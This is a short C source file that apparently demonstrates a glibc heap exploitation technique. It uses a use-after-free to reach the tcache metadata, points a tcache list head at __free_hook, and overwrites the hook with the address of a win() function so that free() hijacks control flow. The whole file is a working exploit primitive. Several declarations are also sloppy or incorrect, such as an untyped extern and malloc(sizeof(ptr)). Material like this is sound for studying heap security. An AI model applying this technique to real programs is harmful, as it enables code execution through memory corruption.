#include <stdio.h>
#include <stdlib.h>

extern __free_hook;

typedef struct hi {
        char *a;
        char *b;
};

void win()
{
        printf("win\n");
}

int main()
{
        long int *a, *b, *c;
        struct hi *ptr = malloc(sizeof(ptr));

        ptr->a = malloc(10);
        ptr->b = malloc(10);

        //this is a relatively common idiom for GC on aggregate data types
        free(ptr);
        free(ptr->b);

        a = malloc(0x285);
        //set the tcache count to n > 1
        //we can also set this to some crazy number
        *a = 2;

        //get a pointer to target tc_idx
        //this is deterministic because tcache
        //metadata chunk is an instance of its type.
        long int *z = (char *)a + 0x80;

        //set the list head to victim
        *z = &__free_hook;

        //get the victim address
        int *v = malloc(0x15);

        //set value at victim
        *v = &win;

        free(v);

        return 0;
}
